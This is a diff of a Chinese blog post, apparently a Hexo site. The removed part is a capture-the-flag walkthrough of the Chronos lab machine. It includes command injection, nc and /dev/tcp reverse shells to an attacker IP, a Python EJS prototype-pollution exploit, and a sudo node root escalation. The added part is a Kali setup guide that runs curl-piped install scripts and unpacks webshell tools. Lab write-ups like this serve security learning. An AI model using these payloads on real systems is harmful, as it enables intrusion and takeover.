-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">现在 Kali 上执行 <span class="built_in">date</span> 命令</span></span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br><span class="line">Today is Saturday, January 07, 2023 08:21:52.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;;ls</span><br><span class="line">Today is Saturday, January 07, 2023 08:22:19.</span><br><span class="line">Desktop  Documents  Downloads  icmptunnel  Music  Pictures  Public  Templates  Videos</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">说明命令执行是成立的，将其 base58 一下</span></span><br><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;;ls</span><br><span class="line"></span><br><span class="line">6o4pVfNt5u68hvKNrAyNuyr7at25Ddm18CEZm8JmX2GYysMajgLA</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231307794.png" alt="image-20230830231307794"></p>
-<ul>
-<li>拿去 BurpSuite 执行以下：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231315785.png" alt="image-20230830231315785"></p>
-<h1 id="Shell-反弹"><a href="#Shell-反弹" class="headerlink" title="Shell 反弹"></a>Shell 反弹</h1><ul>
-<li>既然可以命令执行，看看有木有 NC 存在：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;;ls /bin</span><br><span class="line"></span><br><span class="line">3tMMgHUnzUbrMNnoRimpQhWEkSPfyktyDehmp58hDsbcctg2FwKoAPUxhaD</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231342414.png" alt="image-20230830231342414"></p>
-<ul>
-<li>存在 NC，使用 NC 反弹个 Shell：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">命令执行命令如下</span></span><br><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;| nc 192.168.56.105 4444 -e /bin/sh</span><br><span class="line">2iqHDnc3ghAWrH6eKvF1B8PMgoR7ysZomGDJB2VjxsbCLgGKhqyCHk66Hu1nGdhT7rU37MaUeZNFSuj3ECMRpKQiQQFGP5x3 # 直接显示 Something went wrong，看来目标是不带 -e 的 NC 版本</span><br><span class="line"></span><br><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;| nc 192.168.56.105 4444 | /bin/sh | nc 192.168.56.105 5555</span><br><span class="line">hAtTz52SG2QaueigHmowMJFzXCfFzkS9eFGpvwsi4DFhw6twhFo58YK7E7z3LQ7vFW7Viw8J54wXPBtPjC2mgBZUs8BXfcLnUjxDTFc6GYheEdjG4DnQ5mtrMELCg9F2</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231403041.png" alt="image-20230830231403041"></p>
-<h1 id="Express-fileupload-提权"><a href="#Express-fileupload-提权" class="headerlink" title="Express-fileupload 提权"></a>Express-fileupload 提权</h1><ul>
-<li>查看一下靶机当前用户信息：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span></span><br><span class="line">www-data</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd</span></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">......</span><br><span class="line">imera:x:1000:1000:imera:/home/imera:/bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>发现有一个 imera 用户，去它的家目录看看：</li>
+<li>设置 kali 密码：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> /home/imera</span></span><br><span class="line">user.txt</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> -l /home/imera</span></span><br><span class="line">-rw------- 1 imera imera 37 Aug  3  2021 user.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd kali</span><br></pre></td></tr></table></figure>
+<h2 id="终端美化（一）"><a href="#终端美化（一）" class="headerlink" title="终端美化（一）"></a>终端美化（一）</h2><h3 id="上传壁纸图片"><a href="#上传壁纸图片" class="headerlink" title="上传壁纸图片"></a>上传壁纸图片</h3><ul>
+<li>上传 kali 压缩包：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~/Desktop/kali &amp;&amp; unzip picture.zip &amp;&amp; mv picture/* ~/Pictures &amp;&amp; rm -rf p*</span><br></pre></td></tr></table></figure>
+<h3 id="复制-粘贴修改"><a href="#复制-粘贴修改" class="headerlink" title="复制&#x2F;粘贴修改"></a>复制&#x2F;粘贴修改</h3><ul>
+<li>右键“这里打开终端” -&gt; “文件” -&gt; “快捷键” -&gt; “复制选取” -&gt; Ctrl+C -&gt; “粘贴剪切板内容” -&gt; Ctrl+V。</li>
+</ul>
+<h3 id="个性化设置"><a href="#个性化设置" class="headerlink" title="个性化设置"></a>个性化设置</h3><ul>
+<li>右键这里打开终端 -&gt; 文件 -&gt; 界面设置 -&gt; 字体修改为 12 -&gt; 无滚动栏 -&gt; 条状光标 -&gt; 透明设置 10 % -&gt; 终端透明度 10% -&gt; 隐藏窗口内框。</li>
+</ul>
+<h2 id="修改更新源"><a href="#修改更新源" class="headerlink" title="修改更新源"></a>修改更新源</h2><ul>
+<li>输入如下命令即可：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo tee /etc/apt/sources.list &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">EOF</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+<h2 id="中文调整"><a href="#中文调整" class="headerlink" title="中文调整"></a>中文调整</h2><ul>
+<li>安装中文字体、设置系统语言区</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install ttf-wqy-zenhei -y &amp;&amp; sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><p>发现一个 user.txt 文件，但是权限不够无法查看文件内容。那作者的意图很明显，需要我们提权到 imera 用户或者 root 用户去打开这个文件。</p>
-</li>
-<li><p>查看一个当前靶机信息：</p>
-</li>
+<li>之后会弹出选择界面，下滑到底，空格选中 <code>zh_CN.UTF-8 UTF-8</code> 回车后，再次选择 <code>zh_CN.UTF-8</code> 继续回车即可。</li>
+<li>安装小企鹅输入法，安装完成后，重启即可：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">uname</span> -a</span></span><br><span class="line">Linux chronos 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">lsb_release -a</span></span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04.1 LTS</span><br><span class="line">Release:        18.04</span><br><span class="line">Codename:       bionic</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span></span><br><span class="line">......</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install fcitx fcitx-table-wbpy -y &amp;&amp; sudo shutdown -r now</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>内核版本比较高，SUID 没有可利用文件。查看靶机开放的端口：</li>
+<li>每次需要使用时按 <code>Ctrl+space</code> 可以切换输入法。</li>
+<li>后续会遇到“将标准文件夹更新到当前语言吗？”，勾选“不要再次询问我”，点击“保留旧的名称”。</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">netstat -ntlp</span></span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::8000                 :::*                    LISTEN      852/node            </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>发现有一个只能在本机访问的 8080 端口。重来，查看文件，找一下 8080 的服务：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">app.js</span><br><span class="line">node_modules</span><br><span class="line">package.json</span><br><span class="line">package-lock.json</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> app.js</span></span><br><span class="line">......</span><br><span class="line">const port = 8000; # 发现是一个 8000 端口的 Web 服务</span><br><span class="line">......</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> .. ; <span class="built_in">ls</span></span></span><br><span class="line">chronos</span><br><span class="line">chronos-v2 # 发现一个 v2 版本的，很有可能就是我们需要的东西</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cd</span> chronos-v2;<span class="built_in">ls</span></span></span><br><span class="line">backend # 后端目录</span><br><span class="line">frontend</span><br><span class="line">index.html</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">ls</span> backend</span></span><br><span class="line">node_modules</span><br><span class="line">package.json</span><br><span class="line">package-lock.json</span><br><span class="line">server.js</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> server.js</span></span><br><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const fileupload = require(&quot;express-fileupload&quot;);</span><br><span class="line">const http = require(&#x27;http&#x27;)</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.use(fileupload(&#123; parseNested: true &#125;));</span><br><span class="line"></span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line">app.set(&#x27;views&#x27;, &quot;/opt/chronos-v2/frontend/pages&quot;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">   res.render(&#x27;index&#x27;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const server = http.Server(app);</span><br><span class="line">const addr = &quot;127.0.0.1&quot;</span><br><span class="line">const port = 8080; 				# 找到了</span><br><span class="line">server.listen(port, addr, () =&gt; &#123;</span><br><span class="line">   console.log(&#x27;Server listening on &#x27; + addr + &#x27; port &#x27; + port);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span> package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;some-website&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;&quot;,</span><br><span class="line">  &quot;main&quot;: &quot;server.js&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node server.js&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;author&quot;: &quot;&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;ejs&quot;: &quot;^3.1.5&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;^4.17.1&quot;,</span><br><span class="line">    &quot;express-fileupload&quot;: &quot;^1.1.7-alpha.3&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ps -aux | grep imera</span></span><br><span class="line">imera      838  0.0  2.9 599120 38444 ?        Ssl  13:26   0:00 /usr/local/bin/node /opt/chronos-v2/backend/server.js</span><br><span class="line">www-data  1475  0.0  0.0  13144  1036 ?        S    14:11   0:00 grep imera</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>由于对 node.js 不太熟悉，经过他人提示，发现  express-fileupload 用于上载文件的中间件。百度一下看看有木有漏洞：</p>
-<ul>
-<li>漏洞文章：<a href="https://www.sohu.com/a/412389503_100002744">https://www.sohu.com/a/412389503_100002744</a></li>
-<li>漏洞原理：<a href="https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/">https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/</a></li>
-<li>漏洞博客：<a href="https://blog.p6.is/Real-World-JS-1/">https://blog.p6.is/Real-World-JS-1/</a></li>
-<li>exp 地址：<a href="https://github.com/boiledsteak/EJS-Exploit">https://github.com/boiledsteak/EJS-Exploit</a></li>
+<h2 id="Qv2ray（工具安装）"><a href="#Qv2ray（工具安装）" class="headerlink" title="Qv2ray（工具安装）"></a>Qv2ray（工具安装）</h2><ul>
+<li>下载如下两个文件： <ul>
+<li><a href="https://github.com/v2fly/v2ray-core">https://github.com/v2fly/v2ray-core</a></li>
+<li><a href="https://github.com/Qv2ray/Qv2ray">https://github.com/Qv2ray/Qv2ray</a></li>
 </ul>
 </li>
-<li><p>exp 代码如下，在 Kali 上进行创建 exp.py 文件：</p>
-</li>
+<li>进行如下操作：</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">### imports</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">### commands to run on victim machine</span></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.56.105/6666 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Starting Attack...&quot;</span>)</span><br><span class="line"><span class="comment">### pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">### execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finished!&quot;</span>)</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir ~/tools ; cd ~/Desktop/kali/tools ; cp -r ~/Desktop/kali/tools/* ~/tools ; cd ~/tools ; unzip &quot;*&quot; ; unzip v2ray/v2ray-linux-64.zip -d v2ray; rm -rf v2ray/v2ray-linux-64.zip ; chmod +x v2ray/Qv2ray-v2.7.0-linux-x64.AppImage ; unzip tunnel/&quot;*&quot; -d tunnel ; unzip webshell/antsword.zip -d webshell ; unzip webshell/Behinder_v4.0.6.zip -d webshell/behinder ; mkdir webshell/godzilla ; mv webshell/godzilla.jar webshell/godzilla ; mv tunnel/Venom\ v1.1.0/ tunnel/Venom ; mv tunnel/dist tunnel/pystinger ; mv vulhub-master vulnhub;rm -rf *.zip ; rm -rf webshell/*.zip ; rm -rf tunnel/*.zip</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>在 Kali 上开启 Web 服务，在靶机上进行 exp 下载：</li>
+<li>点击首选项 -&gt; 内核设置 -&gt; <code>/opt/v2ray/v2ray,/opt/v2ray</code> -&gt; 检查 V2RAY 核心设置 -&gt; 入栈设置 -&gt; SOCKS 1089 -&gt; 连接设置 -&gt; 取消绕过中国大陆 -&gt; DNS 设置 -&gt; 114.114.114.114 -&gt; OK</li>
+<li>点击分组 -&gt; 修改分组名称 -&gt; 订阅设置 -&gt; 粘贴订阅地址 -&gt; 订阅类型选择第二个 -&gt; 点击更新订阅 -&gt; OK</li>
+<li>设置本地代理：</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启 Web 服务</span><br><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br><span class="line"># 开启监听</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lvvp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"># 查看是否有下载工具 wget 执行环境 Python</span><br><span class="line">which wget</span><br><span class="line">/usr/bin/wget</span><br><span class="line"></span><br><span class="line">which python</span><br><span class="line">/usr/bin/python3</span><br><span class="line"></span><br><span class="line"># exp 下载</span><br><span class="line">cd /tmp # tmp 目录权限大</span><br><span class="line">python3 exp.py</span><br><span class="line"></span><br><span class="line"># 监听成功</span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nc -lvvp 6666</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.56.105] from chronos.local [192.168.56.108] 41022</span><br><span class="line">bash: cannot set terminal process group (838): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">imera@chronos:/opt/chronos-v2/backend$</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830231601486.png" alt="image-20230830231601486"></p>
-<ul>
-<li>获得了 imera 用户的权限，查看一下之前看不了的 user.txt 文件：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">imera@chronos:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &quot;s/socks4.*127.0.0.1.*/socks5  127.0.0.1 1089/&quot; /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>得到第一个 <code>flag：byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</code>（时间飞逝我的朋友）</li>
+<li>配置命令：</li>
 </ul>
-<h1 id="Sudo-提权"><a href="#Sudo-提权" class="headerlink" title="Sudo 提权"></a>Sudo 提权</h1><ul>
-<li>还差一个 flag，但是在进入 root 目录时，还是显示权限不够：</li>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~/tools/toolsbin ; echo &#x27;nohup ~/tools/v2ray/Qv2ray-v2.7.0-linux-x64.AppImage &gt;/dev/null 2&gt;&amp;1 &amp;&#x27; &gt; v2 ; chmod +x v2 ; echo &#x27;export PATH=$PATH:/root/tools/toolsbin&#x27; &gt;&gt; ~/.zshrc ; source ~/.zshrc</span><br></pre></td></tr></table></figure>
+<h2 id="终端美化（二）"><a href="#终端美化（二）" class="headerlink" title="终端美化（二）"></a>终端美化（二）</h2><h3 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h3><ul>
+<li>Kali 自带 zsh 环境，直接安装 zsh 即可。</li>
+<li>参考地址：<a href="https://www.mintimate.cn/2021/02/05/configZsh/">https://www.mintimate.cn/2021/02/05/configZsh/</a></li>
+<li>官方脚本：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">imera@chronos:~$ cd /root</span><br><span class="line">cd /root</span><br><span class="line">bash: cd: /root: Permission denied</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains sh -c &quot;$(curl -kfsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>说明，还要进行一次提权，通过信息收集，发现 sudo 命令有提权的可能：</li>
+<li>大佬的脚本：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">imera@chronos:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for imera on chronos:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User imera may run the following commands on chronos:</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/npm *</span><br><span class="line">    (ALL) NOPASSWD: /usr/local/bin/node *</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zsh -c &quot;$(curl -kfsSL &#x27;https://api.host.mintimate.cn/fileHost/public/download/1P0R&#x27;)&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">proxychains wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh</span></span><br><span class="line">proxychains zsh install.sh</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><p>通过 GTFOBins 网站的查找，发现 npm 和 node 命令都存在提权的可能，依次尝试一下：</p>
-<ul>
-<li>GTFOBins：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
+<li>关闭自动转义，更换皮肤：</li>
 </ul>
-</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">npm 提权</span></span><br><span class="line">imera@chronos:~$ TF=$(mktemp -d)</span><br><span class="line">TF=$(mktemp -d)</span><br><span class="line">imera@chronos:~$ echo &#x27;&#123;&quot;scripts&quot;: &#123;&quot;preinstall&quot;: &quot;/bin/sh&quot;&#125;&#125;&#x27; &gt; $TF/package.json</span><br><span class="line">&lt;ts&quot;: &#123;&quot;preinstall&quot;: &quot;/bin/sh&quot;&#125;&#125;&#x27; &gt; $TF/package.json</span><br><span class="line">imera@chronos:~$ sudo npm -C $TF --unsafe-perm i</span><br><span class="line">sudo npm -C $TF --unsafe-perm i</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">preinstall</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">/bin/sh</span></span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=1000(imera) gid=1000(imera) groups=1000(imera)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">node 提权</span></span><br><span class="line">imera@chronos:~$ sudo node -e &#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br><span class="line">&lt;ild_process&quot;).spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf ~/zshrcBak &amp;&amp; sed -i &quot;11i\PROMPT_EOL_MARK=&#x27;&#x27;&quot; ~/.zshrc &amp;&amp; sed -i &quot;11i\DISABLE_MAGIC_FUNCTIONS=true&quot; ~/.zshrc &amp;&amp; sed -i &#x27;s/robbyrussell/steeef/&#x27; ~/.zshrc</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>通过 node 提权成功~，去 root 目录查看：</li>
+<li>安装插件：</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions &amp;&amp; proxychains git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-syntax-highlighting &amp;&amp; proxychains git clone https://github.com/wting/autojump.git</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>得到第二个 <code>flag：YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</code>（今晚我们在沉默中收集梦想）</li>
-<li>打靶结束~</li>
+<li>加载插件：</li>
 </ul>
-<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
-<li>在查看 NC 时，用 which nc 会直接卡住，建议用 ls &#x2F;bin。</li>
-<li>一旦出现页面不显示时间信息时，重启靶机。</li>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">        git</span><br><span class="line">        zsh-autosuggestions</span><br><span class="line">        zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>安装插件：</li>
 </ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/wting/autojump.git ; cd autojump ; ./install.py ; echo &#x27;[[ -s /root/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; source /root/.autojump/etc/profile.d/autojump.sh&#x27; &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>
+<h3 id="中断设置"><a href="#中断设置" class="headerlink" title="中断设置"></a>中断设置</h3><ul>
+<li>由于 Ctrl+C 和中断命令冲突，修改一下中断的快捷键：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;stty intr &quot;^b&quot;&quot; &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure>
+<h3 id="装逼-neofetch"><a href="#装逼-neofetch" class="headerlink" title="装逼 neofetch"></a>装逼 neofetch</h3><ul>
+<li>安装一下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install neofetch -y</span><br></pre></td></tr></table></figure>
+<h2 id="桌面美化"><a href="#桌面美化" class="headerlink" title="桌面美化"></a>桌面美化</h2><h3 id="桌面壁纸"><a href="#桌面壁纸" class="headerlink" title="桌面壁纸"></a>桌面壁纸</h3><ul>
+<li>右键桌面设置 -&gt; 目录 -&gt; 选择你的图片目录即可。</li>
+</ul>
+<h3 id="图标整理"><a href="#图标整理" class="headerlink" title="图标整理"></a>图标整理</h3><ul>
+<li>右键桌面设置 -&gt; 图标 -&gt; 取消默认图标。</li>
+</ul>
+<h3 id="任务栏调整"><a href="#任务栏调整" class="headerlink" title="任务栏调整"></a>任务栏调整</h3><ul>
+<li>右键任务栏 -&gt; 面板 -&gt; 面板首选项 -&gt; 锁定面板 -&gt; 拖拽任务栏至最下方 -&gt; 锁定面板 -&gt; 对于不需要的图标进行 remove 即可 -&gt; 时间修改为 24 小时制（时区）</li>
+</ul>
+<h3 id="外观改变"><a href="#外观改变" class="headerlink" title="外观改变"></a>外观改变</h3><ul>
+<li>外观 -&gt; 样式 -&gt; Adwaite-dark</li>
+</ul>
+<h3 id="文件夹显示"><a href="#文件夹显示" class="headerlink" title="文件夹显示"></a>文件夹显示</h3><ul>
+<li>打开文件夹 -&gt; 视图 -&gt; 列表视图 -&gt; 按所需放大</li>
+</ul>
+<h3 id="电源管理"><a href="#电源管理" class="headerlink" title="电源管理"></a>电源管理</h3><ul>
